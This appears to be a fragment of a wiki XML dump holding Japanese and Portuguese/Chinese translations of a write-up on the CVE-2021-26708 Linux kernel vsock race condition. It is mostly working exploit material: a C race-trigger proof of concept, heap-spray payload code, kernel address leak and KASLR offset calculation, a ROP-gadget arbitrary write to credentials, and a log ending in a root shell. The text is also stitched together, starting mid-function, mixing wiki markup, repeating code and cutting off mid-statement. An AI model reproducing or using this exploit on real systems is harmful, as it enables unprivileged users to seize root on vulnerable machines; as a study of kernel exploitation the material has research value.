    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
しかし、msg_msgを使って内部監査データを読むにはどうすればいいのでしょうか？ msgrcv()のシステムコールファイルを読んでみると、msgrcv()とMSGフラグを使った良い解決策が見つかりました：。
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
このフラグは、メッセージデータをメッセージキューから削除することなく、カーネルがユーザースペースにコピーすることを意味します。 カーネルにCONFIG_CHECKPOINT_RESTORE=yが設定されている場合、MSGは利用可能であり、Fedora Serverでも適用可能です。

任意の読み取りのためのステップ

準備
sched_getaffinity()およびCPU_COUNT()を使用して、使用可能なCPUの数を計算します（このエクスプロイトでは、少なくとも2つのCPUが必要です）。
パージングのために/dev/kmsgを開く。
mmap()は、userfaultfd()をspray_dataメモリ領域の最後の部分として設定します。
userfaultfd()イベントを処理するために、別のpthreadを起動します。
msg_msgでsetxattr()とuserfaultfd()のヒープインジェクションを行うために127個のスレッドを立ち上げ、thread_barrierに掛けます。
オリジナルのmsg_msgのカーネルアドレスを取得します。
仮想ソケットの条件付き競争
2回目のconnect()の後、ビジー・ループで35マイクロ秒待つ。
msgsnd() を呼び出して別のメッセージキューを作成します。メモリ破壊の後、msg_msg ペアは virtio_vsock_sock の場所に置かれます。
カーネルログを解析し、カーネル警告（RCXレジスタ）からmsg_msgのカーネルアドレスを保存する。
また，RBXレジスタからvsock_sockのカーネルアドレスが格納される。
破壊された msg_msg を使って、元の msg_msg の任意の解放を行います。
メモリ破壊を実装するために、SO_VM_SOCKETS_BUFFER_SIZEとして、オリジナルのmsg_msgアドレスの4バイトを使用します。
仮想ソケットの条件付き競争
msgsnd()は2回目のconnect()の直後に呼び出され、msg_msgは破壊を実装するためにvirtio_vsock_sockの場所に置かれます。
破棄された msg_msg のセキュリティ・ポインタには、（ステップ 2 からの）元の msg_msg のアドレスが格納されます。

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

msgsnd()の処理中にsetsockopt()スレッドのmsg_msg.securityメモリの破損が発生し、さらにSELinuxの特権チェックが失敗する場合。
この場合、msgsnd()は-1を返し、破損したmsg_msgは破棄されます。msg_msg.securityを解放すると、元のmsg_msgが解放されます。
オリジナルのmsg_msgを制御可能なペイロードで上書きします。
msgsnd()が失敗した後、この脆弱性はpthread_barrier_wait()を呼び出し、ヒープイジェクションに使用される127のpthreadを呼び出します。
これらのpthreadは、setxattr()のペイロードを実行します。
オリジナルの msg_msg は制御可能なデータで上書きされ、msg_msg.next は vsock_sock オブジェクトが格納されているアドレスを指します。

[[File:T0140baae964febb059.png | 600px ]]

上書きされたmsg_msgを保持するメッセージキューからメッセージを受信して、vsock_sockカーネルオブジェクトの内容をユーザ空間に読み出す。
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

ターゲットを見つける

私が見つけたポイントを紹介します。
1. PINGv6やsock_inode_cacheのような専用ブロックキャッシュは、オブジェクトへの多くのポインタを持っています。
2. struct mem_cgroup *sk_memcg pointer at vsock_sock.sk offset 664. mem_cgroup構造体は、kmalloc-4kブロックキャッシュに割り当てられます。
3. vsock_sock.skのオフセット840にあるconst struct cred *ownerポインタは、特権昇格のためにオーバーライドできるクレデンシャルのアドレスを保持します。
4. void (*sk_write_space)(struct sock *)関数は、vsock_sock.skのオフセット688にあるsock_def_write_space()カーネル関数のアドレスに設定されます。 KASLRのオフセットを計算するために使用することができます。

脆弱性がメモリからこれらのピンを抽出する方法は以下の通りです。

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

sk_buffにUse-after-freeを実装する

Linuxカーネルのネットワーク関連のバッファは、struct sk_buffで表されます。 このペアには、skb_shared_infoとdestructor_argがあり、ストリームハイジャックの制御に利用できます。 ネットワークデータとskb_shared_infoは、sk_buff.headが指す同じカーネルメモリブロックに配置されます。 したがって、ユーザースペースで2800バイトのネットワークパケットを作成すると、mem_cgroupのペアと同様に、skb_shared_infoがkmalloc-4kブロックキャッシュに割り当てられます。

以下の手順で構築しました。

socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)を使って、クライアントソケットと32個のサーバーソケットを作成する。

ユーザースペースに2800バイトのバッファを用意し、0x42でmemset()する。

3. sendto()を使用して、このバッファをクライアントソケットから、kmalloc-4kでsk_buffオブジェクトを作成するために使用した各サーバーソケットに送信する。 利用可能なCPUごとに`sched_setaffinity()を使用します。

4.vsock_sockに任意の読み取り手続きを行う

sk_memcgに4096（kmalloc-4kの次の要素）を加えたsk_buffのカーネルアドレスを計算する。

6.この可能性のあるsk_buffのアドレスに任意の読み取りを行う。

7. ネットワークデータの位置に0x424242424242luが見つかった場合、実際のsk_buffを見つけ、ステップ8に進む。そうでない場合、可能性のあるsk_buffのアドレスに4096を加え、ステップ6に進む。

8. sk_buff が 32 個の pthread の setxattr() と userfaultfd() のヒープジェットを実行し、それを pthread_barrier にフックする。

9.sk_buffカーネルアドレスの恣意的な公開

10. pthread_barrier_wait() を呼び出し、32 の setxattr() を実行して skb_shared_info の heapspray pthreads を上書きする。

11.サーバ・ソケットからネットワーク・メッセージを受信するには、recv()を使用します。

skb_shared_infoで任意に書き込み

以下は、オーバーライドされたsk_buffオブジェクトの有効なペイロードです。

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

skb_shared_infoは、排出されたデータのちょうどSKB_SHINFO_OFFSETの位置、すなわち3776バイト目に存在する。skb_shared_info.destructor_arg ポインタには、struct ubuf_info のアドレスが格納される。 攻撃されたsk_buffのカーネルアドレスがわかっているので、ネットワークバッファのMY_UINFO_OFFSETに偽のubuf_infoを作成することができます。有効なペイロードのレイアウトは以下のとおりです。

[[File:T0185ccbf9f025c74da.png  | 600px]]

ここでは、destructor_argのコールバックを紹介します。
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

vmlinuz-5.10.11-200.fc33.x86_64では、私のニーズを満たすガジェットが見つからないので、自分で調べて作ってみました。

コールバック関数のポインタにはROPガジェットのアドレスが格納され、RDIにはコールバック関数の第1引数であるubuf_info自身のアドレスが格納され、RDI + 8はubuf_info.descを指す。ガジェットはubuf_info.descをRDXに移動する。現在RDX には、有効なユーザーIDとグループIDから1バイトを除いたアドレスが含まれています。 このバイトは重要です。ガジェットがRSIからRDXが指すメモリにメッセージ1を書き込むと、有効なuidとgidは0で上書きされます。 権限がrootに昇格するまで同じプロセスを繰り返します。プロセス全体の出力ストリームは次のようになります。
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

ビデオ
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


参考
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>ninxqojjukn8ljx8qjqv6zhl2dz0qhf</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26708 Linux kernel before 5.10.13 特權提升漏洞/pt</title>
    <ns>0</ns>
    <id>2078</id>
    <revision>
      <id>2502</id>
      <timestamp>2021-05-06T01:36:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "A criação de sockets &lt;code&gt; AF_VSOCK &lt;/code&gt; está disponível para usuários não privilegiados e não requer espaço de nome de usuário."</comment>
      <origin>2502</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="27128" sha1="3jg4gb46jf481866lhjw8zddl30g7en" xml:space="preserve">&lt;languages  /&gt;
== Vulnerabilidade ==

Essas vulnerabilidades são condições de corrida causadas pelo bloqueio incorreto em &lt;code&gt; net / vmw_vsock / af_vsock.c &lt;/code&gt;. Essas competições condicionais foram introduzidas implicitamente no envio que adicionou o suporte a multitransporte VSOCK em novembro de 2019 e foram incorporadas à versão do kernel Linux 5.5-rc1.

&lt;code&gt; CONFIG_VSOCKETS &lt;/code&gt; e &lt;code&gt; CONFIG_VIRTIO_VSOCKETS &lt;/code&gt; são fornecidos como módulos do kernel em todas as principais distribuições GNU / Linux. Quando você cria um soquete para o domínio AF_VSOCK, esses módulos vulneráveis ​​são carregados automaticamente.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

A criação de sockets &lt;code&gt; AF_VSOCK &lt;/code&gt; está disponível para usuários não privilegiados e não requer espaço de nome de usuário.


== Corrupção de memória ==

A seguir está uma introdução detalhada ao uso de CVE-2021-26708, usando a competição condicional em &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt;. Dois threads são necessários para reproduzir. O primeiro thread chama &lt;code&gt; setsockopt () &lt;/code&gt;:
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



O segundo thread muda a transmissão do soquete virtual quando &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt; tenta adquirir o bloqueio do soquete, reconectando o soquete virtual:
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


Para processar o &lt;code&gt; connect () &lt;/code&gt; do socket virtual, o kernel executa &lt;code&gt; vsock_stream_connect () &lt;/code&gt; que chama &lt;code&gt; vsock_assign_transport () &lt;/code&gt;. Esta função contém o seguinte código:
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;vsock_stream_connect()&lt;/code&gt;包含套接字鎖，並行線程中的&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;也嘗試獲取它，構成條件競爭。因此，當用不同的&lt;code&gt;svm_cid&lt;/code&gt;進行第二次&lt;code&gt;connect()&lt;/code&gt;時，&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;函數被調用。該函數執行&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;，釋放&lt;code&gt;vsock_sock.trans&lt;/code&gt;，&lt;code&gt;vsk-&gt;transport&lt;/code&gt;被設置為NULL。當&lt;code&gt;vsock_stream_connect()&lt;/code&gt;釋放套接字鎖時，&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;可以繼續執行。它調用&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;，隨後調用&lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;。這裡transport包含一個來自本地變量的過時的值，與&lt;code&gt;vsk-&gt;transport&lt;/code&gt;不匹配(本因被設為NULL)。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
內核執行&lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;，出現內存破壞：
&lt;/div&gt;
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡，vvs是指向內核內存的指針，它已經在&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;中被釋放。 &lt;code&gt;struct virtio_vsock_sock&lt;/code&gt;的大小為64字節，位於kmalloc-64塊緩存中。 buf_alloc字段類型為u32，位於偏移量40。 &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE是0xFFFFFFFFUL&lt;/code&gt;。 *val的值由攻擊者控制，它的四個最不重要的字節被寫入釋放的內存中。
&lt;/div&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==模糊測試==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
syzkaller fuzzer沒有辦法重現這個崩潰，於是我決定自行研究。但為什麼fuzzer會失敗呢？觀察&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;有所發現：
&lt;/div&gt;
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
只有當val與當前的buffer_size不同時，才會調用&lt;code&gt;notify_buffer_size()&lt;/code&gt;，也就是說&lt;code&gt;setsockopt()&lt;/code&gt;執行&lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;時，每次調用的size參數都應該不同。於是我構建了相關代碼:
&lt;/div&gt;
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡的size值取自&lt;code&gt;clock_gettime()&lt;/code&gt;返回的納秒數，每次都可能不同。原始的syzkaller不會這麼處理，因為在syzkaller生成 fuzzing輸入時，syscall參數的值被確定，執行時不會改變。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==四字節的力量==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡我選擇Fedora 33 Server作為研究目標，內核版本為5.10.11-200.fc33.x86_64，並決心繞過SMEP和SMAP。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
第一步，我開始研究穩定的堆噴射，該漏洞利用執行用戶空間的活動，使內核在釋放的virtio_vsock_sock的位置分配另一個64字節的對象。經過幾次實驗性嘗試後，確認釋放的virtio_vsock_sock被覆蓋，說明堆噴射是可行的。最終我找到了msgsnd() syscall。它在內核空間中創建了struct msg_msg，見pahole輸出：
&lt;/div&gt;
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
前面是消息頭，後面是消息數據。如果用戶空間中的struct msgbuf有一個16字節的mtext，則會在kmalloc-64塊緩存中創建相應的msg_msg。 4字節的write-after-free會破壞偏移量40的void *security指針。 msg_msg.security字段指向由lsm_msg_msg_alloc()分配的內核數據，當收到 msg_msg時，就會被security_msg_msg_free()釋放。因此，破壞security指針的前半部分，就能獲得 arbitrary free。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==內核信息洩露==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡使用了[https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683]相同的技巧。虛擬套接字的第二個connect()調用&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;，將&lt;code&gt;vsk-&gt;transport&lt;/code&gt;設置為NULL，使得&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;在內存崩潰後調用&lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;，出現內核告警：
&lt;/div&gt;
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過gdb調試，發現RCX寄存器包含了釋放的virtio_vsock_sock的內核地址，RBX寄存器包含了vsock_sock的內核地址。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==實現任意讀==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===從 arbitrary free 到 use-after-free===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
從洩露的內核地址釋放一個對象
執行堆噴，用受控數據覆蓋該對象
使用損壞的對象進行權限升級
內核實現的System V消息有限制最大值DATALEN_MSG，即PAGE_SIZE減去sizeof(struct msg_msg))。如果你發送了更大的消息，剩餘的消息會被保存在消息段的列表中。 msg_msg中包含struct msg_msgseg *next用於指向第一個段，size_t m_ts用於存儲大小。當進行覆蓋操作時，就可以把受控的值放在msg_msg.m_ts和msg_msg.next中：
&lt;/div&gt;

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
